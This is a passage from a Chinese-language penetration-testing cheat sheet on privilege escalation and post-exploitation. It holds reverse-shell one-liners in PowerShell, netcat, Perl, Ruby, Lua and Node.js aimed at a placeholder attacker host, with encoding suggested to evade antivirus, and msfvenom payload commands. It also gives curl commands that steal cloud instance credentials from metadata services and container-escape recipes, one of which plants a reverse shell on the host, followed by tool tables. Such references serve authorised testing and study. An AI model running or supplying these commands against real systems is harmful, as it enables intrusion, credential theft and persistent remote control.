powershell -nop -c "$c=New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',PORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"

# Base64 编码版 (推荐免杀)
powershell -e BASE64_ENCODED
```

### 5.5 Netcat

```bash
# 传统 netcat (-e 参数)
nc -e /bin/bash ATTACKER_IP PORT

# OpenBSD netcat (无 -e, 用命名管道)
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER_IP PORT > /tmp/f
```

### 5.6 其他语言一行反弹

**Perl**:
```perl
perl -e 'use Socket;$i="ATTACKER_IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'
```

**Ruby**:
```ruby
ruby -rsocket -e 'f=TCPSocket.open("ATTACKER_IP",PORT);exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f.fileno,f.fileno,f.fileno)'
```

**Lua**:
```lua
lua -e "local s=require('socket');local t=s.tcp();t:connect('ATTACKER_IP',PORT);os.execute('/bin/sh -i <&'..t:getfd()..' >&'..t:getfd()..' 2>&'..t:getfd())"
```

**Node.js**:
```javascript
require('child_process').exec('bash -c "bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1"')
```

### 5.7 Meterpreter (Metasploit)

```bash
# Linux
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f elf -o shell.elf

# Windows
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f exe -o shell.exe
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f psh-reflection -o shell.ps1
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f dll -o shell.dll

# 监听
msfconsole -q -x "use multi/handler; set payload linux/x64/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT PORT; run"
```



---

## 6. 2025-2026 最新 CVE

### 6.1 Linux 内核提权 (2026)

**CVE-2026-31431 — "Copy Fail" (CVSS 7.8, CISA KEV)**

| 属性 | 详情 |
|------|------|
| **影响组件** | `algif_aead` 加密模块 (内核 4.14+, 2017年起, ~9年潜伏) |
| **披露** | 2026 年 4 月 |
| **公开 POC** | 是 (732 字节 Python 脚本) |
| **影响** | 本地 root + 容器逃逸 |
| **原理** | 非特权用户通过 `AF_ALG` socket + `splice()` 向任意可读文件 (如 `/usr/bin/su`) 的 page cache 写入 4 字节受控数据。磁盘文件本身不被修改，**绕过 Tripwire/AIDE 完整性监控**。Page cache 主机共享 -> 容器逃逸 |
| **云影响** | `linux-aws`, `linux-gcp`, `linux-azure`, `linux-oracle`, `linux-kvm` |
| **修复内核** | 6.1.130+, 6.6.87+, 6.12.23+ |
| **临时缓解** | `modprobe -r algif_aead` 或 seccomp 阻断 `AF_ALG` + `splice` |
| **POC** | [GitHub: rippsec/CVE-2026-31431-Copy-Fail](https://github.com/rippsec/CVE-2026-31431-Copy-Fail) |
| **参考** | [Splunk: Detecting Copy Fail](https://www.splunk.com/en_us/blog/security/detecting-copy-fail-cve-2026-31431-phenomenal-power-itty-bitty-script.html) |

**CVE-2026-43284 / CVE-2026-43500 / CVE-2026-45998 / CVE-2026-46000 — "Dirty Frag"**

| 属性 | 详情 |
|------|------|
| **影响组件** | XFRM ESP-in-TCP + RxRPC 共享页面片段 |
| **影响** | 本地提权 + 容器逃逸 |
| **修复** | USN-8374-1 (2026-06-02) |
| **云影响** | 全部云内核变体 |

**CVE-2026-43503 / CVE-2026-46300 — "Fragnesia"**

| 属性 | 详情 |
|------|------|
| **影响组件** | XFRM ESP-in-TCP socket 缓冲区片段处理 |
| **影响** | 本地提权 + 容器逃逸 |
| **云影响** | 全部云内核变体 |

**CVE-2026-23268-23411 — AppArmor LSM 漏洞 (Qualys)**

| 属性 | 详情 |
|------|------|
| **发现者** | Qualys |
| **影响** | 加载/替换/删除任意 AppArmor 策略 -> DoS/内核内存暴露/LPE/容器逃逸 |
| **修复** | USN-8266-1 (2026-05-11) |

**CVE-2026-47326-47337 — AppArmor 通知机制漏洞**

| 属性 | 详情 |
|------|------|
| **影响** | UAF (CVE-2026-47331/47328), OOB 读 (CVE-2026-47332/47333), NULL 解引用 |
| **影响内核** | Ubuntu 6.8, 6.17, 7.0 |

### 6.2 经典 CVE (仍广泛有效)

**Linux**:
| CVE | 名称 | 影响组件 | 影响版本 |
|-----|------|---------|---------|
| CVE-2021-4034 | PwnKit | polkit pkexec | 全版本 < 0.120 |
| CVE-2021-3156 | Baron Samedit | sudo | 1.8.2-1.9.5p1 |
| CVE-2022-0847 | Dirty Pipe | Linux kernel | 5.8 - 5.16.11 |
| CVE-2023-0386 | OverlayFS | Linux kernel | 5.11 - 6.1 |
| CVE-2023-4911 | Looney Tunables | glibc ld.so | glibc 2.34-2.37 |
| CVE-2016-5195 | DirtyCow | Linux kernel | 2.6.22 - 4.8.3 |

**Windows**:
| CVE | 名称 | 影响 |
|-----|------|------|
| CVE-2020-1472 | Zerologon | DC 机器账户密码可置空 |
| CVE-2021-34527 | PrintNightmare | 打印后台处理 RCE/SYSTEM |
| CVE-2021-36942 | PetitPotam | NTLM 强制认证 |
| CVE-2021-42278/42287 | SamAccountName Spoofing | 域提权 |
| CVE-2022-26923 | ADCS ESC1 | 证书模板配置错误 |

### 6.3 云环境凭据窃取

**AWS — EC2 Metadata Service**:
```bash
# IMDSv1 (老版本)
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME

# IMDSv2 (需要 token)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
```

**Azure — Managed Identity**:
```bash
curl -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2019-08-01&resource=https://management.azure.com/"
```

**GCP — Compute Engine**:
```bash
curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google"
```

### 6.4 容器逃逸速查

**检测是否在容器内**:
```bash
cat /proc/1/cgroup | grep -E "docker|kubepods|containerd"
ls -la /.dockerenv 2>/dev/null
cat /proc/1/environ | tr '\0' '\n' | grep -E "KUBERNETES|container"
```

**手法一: 特权容器** (`--privileged`):
```bash
fdisk -l               # 查看宿主机磁盘
mount /dev/sda1 /mnt   # 挂载宿主机根分区
chroot /mnt /bin/bash
```

**手法二: Docker Socket 挂载**:
```bash
ls -la /var/run/docker.sock
docker run -v /:/mnt --rm -it alpine chroot /mnt bash
```

**手法三: cap_sys_admin + cgroup notify_on_release**:
```bash
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/bash' > /cmd
echo 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1' >> /cmd
chmod +x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

**手法四: Kubernetes ServiceAccount 利用**:
```bash
cat /var/run/secrets/kubernetes.io/serviceaccount/token
kubectl --token=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) \
  --server=https://kubernetes.default.svc get pods --all-namespaces
```



---

## 7. 自动化工具速查

### 7.1 Linux

| 工具 | 用途 | 链接 |
|------|------|------|
| **LinPEAS** | 全自动枚举 SUID/cap/cron/kernel/文件权限/网络 | [PEASS-ng](https://github.com/carlospolop/PEASS-ng) |
| **LinEnum** | 老牌枚举脚本，覆盖面广 | [GitHub](https://github.com/rebootuser/LinEnum) |
| **linux-exploit-suggester** | 内核版本 → exploit 推荐 | [GitHub](https://github.com/mzet-/linux-exploit-suggester) |
| **linux-smart-enumeration** | 渐进式枚举 (3级详细) | [GitHub](https://github.com/diego-treitos/linux-smart-enumeration) |
| **pspy** | 无 root 监控进程/cron | [GitHub](https://github.com/DominicBreuker/pspy) |
| **traitor** | 自动 exploits 管道 (含容器逃逸) | [GitHub](https://github.com/liamg/traitor) |
| **GTFOBins** | SUID/Sudo 二进制利用权威手册 | [网站](https://gtfobins.github.io/) |
| **Linikatz** | Linux 凭据收割 (媲美 mimikatz) | [GitHub](https://github.com/CiscoCXSecurity/linikatz) |

### 7.2 Windows

| 工具 | 用途 | 链接 |
|------|------|------|
| **WinPEAS** | 全自动枚举 50+ 检查项 | [PEASS-ng](https://github.com/carlospolop/PEASS-ng) |
| **Seatbelt** | C# 态势感知 | [GitHub](https://github.com/GhostPack/Seatbelt) |
| **PowerUp** | PowerShell 服务/注册表/劫持检查 | [PowerSploit](https://github.com/PowerShellMafia/PowerSploit) |
| **Watson** | 补丁对比 → 缺失补丁的 CVE | [GitHub](https://github.com/rasta-mouse/Watson) |
| **WES-NG** | 最新 Windows Exploit Suggester | [GitHub](https://github.com/bitsadmin/wesng) |
| **Mimikatz** | 凭据 dump (哈希/票据/明文) | [GitHub](https://github.com/gentilkiwi/mimikatz) |
| **Rubeus** | Kerberos 攻击瑞士军刀 | [GitHub](https://github.com/GhostPack/Rubeus) |
| **SharpHound** | BloodHound 采集器 | [GitHub](https://github.com/BloodHoundAD/SharpHound) |
| **BloodHound** | AD 攻击路径可视化分析 | [GitHub](https://github.com/BloodHoundAD/BloodHound) |
| **Certify** | ADCS 攻击枚举 | [GitHub](https://github.com/GhostPack/Certify) |
| **PrintSpoofer** | SeImpersonate → SYSTEM | [GitHub](https://github.com/itm4n/PrintSpoofer) |
| **GodPotato** | SeImpersonate → SYSTEM (新版) | [GitHub](https://github.com/BeichenDream/GodPotato) |

### 7.3 横向移动套件

| 工具 | 用途 | 命令示例 |
|------|------|---------|
| **Impacket** | PtH/PtT/Kerberoast/DCSync/Relay | `impacket-psexec`, `impacket-secretsdump` |
| **NetExec (nxc)** | SMB/WinRM/LDAP/MSSQL 多用 | `nxc smb 10.0.0.0/24 -u user -H hash` |
| **CrackMapExec** | 老版多用扫描/执行 | `cme smb` (逐渐被 nxc 取代) |
| **BloodHound** | AD 攻击路径分析 | SharpHound 采集 → Neo4j 分析 |
| **Responder** | LLMNR/NBT-NS/mDNS 投毒 | `responder -I eth0` |
| **MITM6** | IPv6 DNS 劫持 + WPAD | `mitm6 -d DOMAIN` |
| **Inveigh** | PowerShell 版投毒 | `Invoke-Inveigh -LLMNR Y -NBNS Y` |

---

## 参考资源

- [GTFOBins](https://gtfobins.github.io/) — SUID/Sudo 二进制利用权威参考
- [LOLBAS](https://lolbas-project.github.io/) — Windows LOLBin 权威参考
- [HackTricks](https://book.hacktricks.xyz/) — 综合渗透测试知识库
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) — 各种 Payload 合集
- [PEASS-ng](https://github.com/carlospolop/PEASS-ng) — 全平台自动化枚举
- [ired.team](https://www.ired.team/) — 红队笔记 (含代码级分析)
- [The Hacker Recipes](https://www.thehacker.recipes/) — AD 攻击技术详解
- [WADComs](https://wadcoms.github.io/) — Windows AD 命令速查
- [Internal All The Things](https://swisskyrepo.github.io/InternalAllTheThings/) — 内网渗透全体系
- [Linux Privilege Escalation 2026 (dev.to)](https://dev.to/lucky_lonerusher/linux-privilege-escalation-2026-suid-sudo-misconfig-cron-jobs-complete-guide-hacking-course-3fo)
- [Windows PrivEsc Guide (dev.to)](https://dev.to/ahzek/windows-privesc-singular-mistakes-costing-you-hours-and-what-actually-gets-you-system-3dmo)
- [Pentesting.Org - Persistence Guide](https://pentesting.org/blog/access-maintenance-guide)
- [Splunk: Detecting Copy Fail CVE-2026-31431](https://www.splunk.com/en_us/blog/security/detecting-copy-fail-cve-2026-31431-phenomenal-power-itty-bitty-script.html)
- [SecurityAffairs: Copy Fail Analysis](https://securityaffairs.com/191519/hacking/copy-fail-new-linux-bug-enables-root-via-page-cache-corruption.html)
- [Ubuntu Security Notice USN-8374-1](https://ubuntu.com/security/notices/USN-8374-1)
- [Ubuntu Security Notice USN-8390-1](https://ubuntu.com/security/notices/USN-8390-1)
